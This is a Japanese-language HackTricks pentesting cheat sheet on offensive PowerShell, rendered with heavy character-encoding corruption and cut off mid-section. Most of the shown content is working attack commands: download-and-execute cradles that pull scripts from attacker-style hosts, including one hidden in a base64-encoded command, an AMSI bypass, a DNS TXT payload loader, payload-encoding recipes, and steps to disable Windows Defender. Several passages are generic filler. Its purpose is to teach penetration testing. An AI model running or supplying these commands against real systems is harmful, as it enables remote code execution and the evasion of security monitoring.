# ãƒšãƒ³ãƒ†ã‚¹ã‚¿ãƒ¼ã®ãŸã‚ã®åŸºæœ¬çš„ãªPowerShell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã®PEASSã‚’å…¥æ‰‹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€PRã‚’** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ã¨** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

## ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã®PowerShellã®å ´æ‰€
```powershell
C:\windows\syswow64\windowspowershell\v1.0\powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell
```
## åŸºæœ¬çš„ãªPSã‚³ãƒãƒ³ãƒ‰ã®é–‹å§‹

PowerShellï¼ˆPSï¼‰ã¯ã€Windowsã‚·ã‚¹ãƒ†ãƒ ã§ä½¿ç”¨ã•ã‚Œã‚‹å¼·åŠ›ãªã‚¹ã‚¯ãƒªãƒ—ãƒˆè¨€èªãŠã‚ˆã³ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ã‚·ã‚§ãƒ«ã§ã™ã€‚Pentesterã¨ã—ã¦ã€PSã‚’ä½¿ç”¨ã—ã¦åŠ¹æœçš„ãªãƒãƒƒã‚­ãƒ³ã‚°ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€ã„ãã¤ã‹ã®åŸºæœ¬çš„ãªã‚³ãƒãƒ³ãƒ‰ã‚’çŸ¥ã£ã¦ãŠãã“ã¨ãŒé‡è¦ã§ã™ã€‚

ä»¥ä¸‹ã¯ã€PentesterãŒå§‹ã‚ã‚‹ãŸã‚ã®åŸºæœ¬çš„ãªPSã‚³ãƒãƒ³ãƒ‰ã§ã™ã€‚

### 1. Get-Process

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€å®Ÿè¡Œä¸­ã®ãƒ—ãƒ­ã‚»ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚Pentesterã¯ã€æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’æŒã¤ãƒ—ãƒ­ã‚»ã‚¹ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-Process
```

### 2. Get-Service

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€å®Ÿè¡Œä¸­ã®ã‚µãƒ¼ãƒ“ã‚¹ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚Pentesterã¯ã€æ‚ªæ„ã®ã‚ã‚‹ã‚µãƒ¼ãƒ“ã‚¹ã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-Service
```

### 3. Get-NetAdapter

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚¢ãƒ€ãƒ—ã‚¿ãƒ¼ã®æƒ…å ±ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚Pentesterã¯ã€ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯æ¥ç¶šã«é–¢ã™ã‚‹æƒ…å ±ã‚’åé›†ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-NetAdapter
```

### 4. Get-NetFirewallRule

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ãƒ«ãƒ¼ãƒ«ã®ä¸€è¦§ã‚’è¡¨ç¤ºã—ã¾ã™ã€‚Pentesterã¯ã€ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã®è¨­å®šã‚’èª¿æŸ»ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-NetFirewallRule
```

### 5. Get-EventLog

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€ã‚¤ãƒ™ãƒ³ãƒˆãƒ­ã‚°ã®ã‚¨ãƒ³ãƒˆãƒªã‚’è¡¨ç¤ºã—ã¾ã™ã€‚Pentesterã¯ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ã‚¤ãƒ³ã‚·ãƒ‡ãƒ³ãƒˆã‚’ç‰¹å®šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

```powershell
Get-EventLog -LogName Security
```

ã“ã‚Œã‚‰ã®åŸºæœ¬çš„ãªPSã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ã§ã€Pentesterã¯Windowsã‚·ã‚¹ãƒ†ãƒ ã®èª¿æŸ»ã‚’é–‹å§‹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Get-Help * #List everything loaded
Get-Help process #List everything containing "process"
Get-Help Get-Item -Full #Get full helpabout a topic
Get-Help Get-Item -Examples #List examples
Import-Module <modulepath>
Get-Command -Module <modulename>
```
## ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã¨å®Ÿè¡Œ

```powershell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')"
```

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯ã€PowerShellã‚’ä½¿ç”¨ã—ã¦ãƒªãƒ¢ãƒ¼ãƒˆã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦å®Ÿè¡Œã™ã‚‹æ–¹æ³•ã§ã™ã€‚

- `powershell -c`ï¼šPowerShellã‚’ã‚³ãƒãƒ³ãƒ‰ãƒ©ã‚¤ãƒ³ãƒ¢ãƒ¼ãƒ‰ã§å®Ÿè¡Œã—ã¾ã™ã€‚
- `IEX`ï¼šInvoke-Expressionã®ç•¥ã§ã€PowerShellã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã§ã™ã€‚
- `(New-Object Net.WebClient).DownloadString('http://example.com/malicious.ps1')`ï¼š`Net.WebClient`ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½œæˆã—ã€æŒ‡å®šã—ãŸURLã‹ã‚‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚

ã“ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ã¨ã€æŒ‡å®šã—ãŸURLã‹ã‚‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã€ãã®ã‚¹ã‚¯ãƒªãƒ—ãƒˆãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚æ³¨æ„ãŒå¿…è¦ãªã®ã¯ã€ä¿¡é ¼ã§ãã‚‹ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®ã¿ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚
```powershell
g
echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.13:8000/PowerUp.ps1') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://10.2.0.5/shell.ps1')|iex"
iex (iwr '10.10.14.9:8000/ipw.ps1') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.10.14.9:8000/ipw.ps1',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("http://10.10.14.9:8000/ipw.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

#https://twitter.com/Alh4zr3d/status/1566489367232651264
#host a text record with your payload at one of your (unburned) domains and do this:
powershell . (nslookup -q=txt http://some.owned.domain.com)[-1]
```
### AMSIãƒã‚¤ãƒ‘ã‚¹ã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ï¼†å®Ÿè¡Œ

This technique allows you to download and execute a file in the background while bypassing AMSI (Antimalware Scan Interface).

#### PowerShellã‚³ãƒ¼ãƒ‰

```powershell
$URL = "http://example.com/file.exe"
$Output = "$env:TEMP\file.exe"

# ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)

# ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’å®Ÿè¡Œ
Start-Process -FilePath $Output -WindowStyle Hidden
```

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€æŒ‡å®šã—ãŸURLã‹ã‚‰ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã€ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒãƒƒã‚¯ã‚°ãƒ©ã‚¦ãƒ³ãƒ‰ã§å®Ÿè¡Œã—ã¾ã™ã€‚ãƒ•ã‚¡ã‚¤ãƒ«ã¯ä¸€æ™‚ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

#### AMSIãƒã‚¤ãƒ‘ã‚¹ã®å®Ÿè¡Œ

```powershell
# AMSIãƒã‚¤ãƒ‘ã‚¹ã‚’æœ‰åŠ¹åŒ–
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ï¼†å®Ÿè¡Œã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ
$URL = "http://example.com/file.exe"
$Output = "$env:TEMP\file.exe"
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile($URL, $Output)
Start-Process -FilePath $Output -WindowStyle Hidden
```

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€AMSIãƒã‚¤ãƒ‘ã‚¹ã‚’æœ‰åŠ¹åŒ–ã—ã¦ã‹ã‚‰ã€ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ï¼†å®Ÿè¡Œã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚AMSIãƒã‚¤ãƒ‘ã‚¹ã«ã‚ˆã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã¨å®Ÿè¡ŒãŒç›£è¦–ã•ã‚Œãšã«å®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
```powershell
Start-Process -NoNewWindow powershell "-nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA="
```
### Linuxã§b64ã‚’ä½¿ç”¨ã™ã‚‹

Linuxã§ã¯ã€`base64`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’Base64å½¢å¼ã«ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ãŠã‚ˆã³ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

- ãƒ•ã‚¡ã‚¤ãƒ«ã‚’Base64å½¢å¼ã«ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹å ´åˆï¼š

```bash
base64 <file> > <output_file>
```

- Base64å½¢å¼ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹å ´åˆï¼š

```bash
base64 -d <file> > <output_file>
```

`<file>`ã¯ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã¾ãŸã¯ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’æŒ‡å®šã—ã€`<output_file>`ã¯çµæœã‚’ä¿å­˜ã™ã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ‘ã‚¹ã‚’æŒ‡å®šã—ã¾ã™ã€‚

ä¾‹ãˆã°ã€`file.txt`ã‚’Base64å½¢å¼ã«ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã™ã‚‹å ´åˆã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

```bash
base64 file.txt > encoded.txt
```

åŒæ§˜ã«ã€`encoded.txt`ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹å ´åˆã¯ã€æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š

```bash
base64 -d encoded.txt > decoded.txt
```

ã“ã‚Œã«ã‚ˆã‚Šã€Linuxã§b64ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ãŠã‚ˆã³ãƒ‡ã‚³ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
```
## ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰

### System.Net.WebClient
```powershell
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
```
### Invoke-WebRequest

`Invoke-WebRequest`ã¯ã€PowerShellã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã§ã‚ã‚Šã€Webã‚µãƒ¼ãƒãƒ¼ã«HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€Webãƒšãƒ¼ã‚¸ã®å†…å®¹ã‚’å–å¾—ã—ãŸã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€`Invoke-WebRequest`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã®ä½¿ç”¨ä¾‹ã§ã™ã€‚

```powershell
Invoke-WebRequest -Uri "https://example.com"
```

ã“ã®ä¾‹ã§ã¯ã€`https://example.com`ã«å¯¾ã—ã¦HTTPãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒé€ä¿¡ã•ã‚Œã¾ã™ã€‚ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã¯ã€PowerShellã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ã—ã¦è¿”ã•ã‚Œã¾ã™ã€‚

`Invoke-WebRequest`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã«ã¯ã€ã•ã¾ã–ã¾ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ãŒã‚ã‚Šã¾ã™ã€‚ãŸã¨ãˆã°ã€`-Method`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€HTTPãƒ¡ã‚½ãƒƒãƒ‰ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ã€`GET`ãƒ¡ã‚½ãƒƒãƒ‰ãŒä½¿ç”¨ã•ã‚Œã¾ã™ãŒã€`POST`ã‚„`PUT`ãªã©ã®ä»–ã®ãƒ¡ã‚½ãƒƒãƒ‰ã‚‚æŒ‡å®šã§ãã¾ã™ã€‚

ã¾ãŸã€`-Headers`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ã€HTTPãƒ˜ãƒƒãƒ€ãƒ¼ã‚’æŒ‡å®šã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚«ã‚¹ã‚¿ãƒ ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«è¿½åŠ ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

`Invoke-WebRequest`ã‚³ãƒãƒ³ãƒ‰ãƒ¬ãƒƒãƒˆã¯ã€ãƒšãƒ³ãƒ†ã‚¹ãƒˆã‚„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£èª¿æŸ»ã®éš›ã«éå¸¸ã«ä¾¿åˆ©ã§ã™ã€‚Webã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã®è„†å¼±æ€§ã‚’ãƒ†ã‚¹ãƒˆã—ãŸã‚Šã€Webã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰æƒ…å ±ã‚’åé›†ã—ãŸã‚Šã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```powershell
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
```
### Wget

Wget is a command-line utility that allows you to retrieve files from the web using HTTP, HTTPS, and FTP protocols. It is commonly used for downloading files, mirroring websites, and recursive downloading.

#### Basic Usage

To download a file using Wget, you can use the following command:

```
wget [URL]
```

Replace `[URL]` with the actual URL of the file you want to download.

By default, Wget will save the downloaded file in the current directory with the same name as the remote file. If you want to specify a different name for the downloaded file, you can use the `-O` option followed by the desired file name:

```
wget -O [output-file] [URL]
```

Replace `[output-file]` with the name you want to give to the downloaded file.

#### Downloading Multiple Files

Wget also allows you to download multiple files at once. You can provide a list of URLs in a text file and use the `-i` option to specify the file containing the URLs:

```
wget -i [file-with-urls]
```

Replace `[file-with-urls]` with the path to the text file containing the URLs.

#### Recursive Downloading

One of the powerful features of Wget is its ability to perform recursive downloading. This means that it can download not only the specified file but also all the files linked to it.

To enable recursive downloading, you can use the `-r` option:

```
wget -r [URL]
```

This will download the specified file and all the files linked to it, creating a local mirror of the website.

#### Conclusion

Wget is a versatile command-line tool for downloading files from the web. It provides various options for customizing the download process, such as specifying output file names and performing recursive downloads.
```powershell
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"
```
### BitsTransfer

BitsTransferã¯ã€PowerShellã®ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã§ã‚ã‚Šã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚„ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã‚’ç°¡å˜ã«è¡Œã†ãŸã‚ã®ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ã§ã™ã€‚BitsTransferã‚’ä½¿ç”¨ã™ã‚‹ã¨ã€é«˜é€Ÿã§ä¿¡é ¼æ€§ã®é«˜ã„ãƒ•ã‚¡ã‚¤ãƒ«è»¢é€ãŒå¯èƒ½ã§ã™ã€‚

BitsTransferã‚’ä½¿ç”¨ã™ã‚‹ã«ã¯ã€ã¾ãš`Import-Module BitsTransfer`ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ãƒ¢ã‚¸ãƒ¥ãƒ¼ãƒ«ã‚’ã‚¤ãƒ³ãƒãƒ¼ãƒˆã—ã¾ã™ã€‚æ¬¡ã«ã€`Start-BitsTransfer`ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã®è»¢é€ã‚’é–‹å§‹ã—ã¾ã™ã€‚

ä»¥ä¸‹ã¯ã€BitsTransferã‚’ä½¿ç”¨ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ä¾‹ã§ã™ã€‚

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://example.com/file.txt" -Destination "C:\Downloads\file.txt"
```

ä¸Šè¨˜ã®ä¾‹ã§ã¯ã€`http://example.com/file.txt`ã‹ã‚‰`C:\Downloads\file.txt`ã«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ã¦ã„ã¾ã™ã€‚

BitsTransferã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã®ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã‚„ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã«ä¾¿åˆ©ãªã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚ä¾‹ãˆã°ã€`-Priority`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦è»¢é€ã®å„ªå…ˆåº¦ã‚’è¨­å®šã—ãŸã‚Šã€`-ProxyUsage`ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ—ãƒ­ã‚­ã‚·ã‚’çµŒç”±ã—ã¦è»¢é€ã‚’è¡Œã£ãŸã‚Šã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

BitsTransferã¯ã€ä¾¿åˆ©ãªãƒ„ãƒ¼ãƒ«ã§ã‚ã‚Šã€PowerShellã‚’ä½¿ç”¨ã—ãŸãƒ•ã‚¡ã‚¤ãƒ«è»¢é€ã‚’ç°¡å˜ã«è¡Œã†ãŸã‚ã®ã‚ªãƒ—ã‚·ãƒ§ãƒ³ã‚’æä¾›ã—ã¦ã„ã¾ã™ã€‚
```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
# OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
## Base64 Kali & EncodedCommand

In this section, we will discuss the usage of Base64 encoding in Kali Linux and the EncodedCommand parameter in PowerShell.

### Base64 Encoding in Kali Linux

Base64 encoding is a technique used to encode binary data into ASCII characters. In Kali Linux, you can use the `base64` command-line tool to encode and decode data using Base64.

To encode a file using Base64, you can use the following command:

```bash
base64 <file> > <output_file>
```

To decode a file encoded with Base64, you can use the following command:

```bash
base64 -d <file> > <output_file>
```

### EncodedCommand Parameter in PowerShell

The EncodedCommand parameter in PowerShell allows you to run a command that is Base64-encoded. This can be useful in scenarios where you want to execute a command without it being easily visible in plain text.

To use the EncodedCommand parameter, you need to encode your PowerShell command using Base64. You can do this using the `[System.Convert]::ToBase64String()` method in PowerShell.

Here is an example of how to use the EncodedCommand parameter:

```powershell
powershell.exe -EncodedCommand <Base64_encoded_command>
```

Replace `<Base64_encoded_command>` with the Base64-encoded version of your PowerShell command.

Keep in mind that using the EncodedCommand parameter can help obfuscate your commands, but it is not foolproof. Advanced attackers can still decode and analyze the encoded commands.
```powershell
kali> echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.9:8000/9002.ps1')" | iconv --to-code UTF-16LE | base64 -w0
PS> powershell -EncodedCommand <Base64>
```
## [å®Ÿè¡Œãƒãƒªã‚·ãƒ¼](../authentication-credentials-uac-and-efs.md#ps-execution-policy)

## [åˆ¶ç´„è¨€èª](broken-reference/)

## [AppLockerãƒãƒªã‚·ãƒ¼](broken-reference/)

## WinRMã®æœ‰åŠ¹åŒ– (ãƒªãƒ¢ãƒ¼ãƒˆPS)
```powershell
enable-psremoting -force #This enables winrm

# Change NetWorkConnection Category to Private
#Requires -RunasAdministrator

Get-NetConnectionProfile |
Where{ $_.NetWorkCategory -ne 'Private'} |
ForEach {
$_
$_|Set-NetConnectionProfile -NetWorkCategory Private -Confirm
}
```
## Defenderã®ç„¡åŠ¹åŒ–

{% code overflow="wrap" %}
```powershell
# Check status
Get-MpComputerStatus
Get-MpPreference | select Exclusion* | fl #Check exclusions
# Disable
Set-MpPreference -DisableRealtimeMonitoring $true
#To completely disable Windows Defender on a computer, use the command:
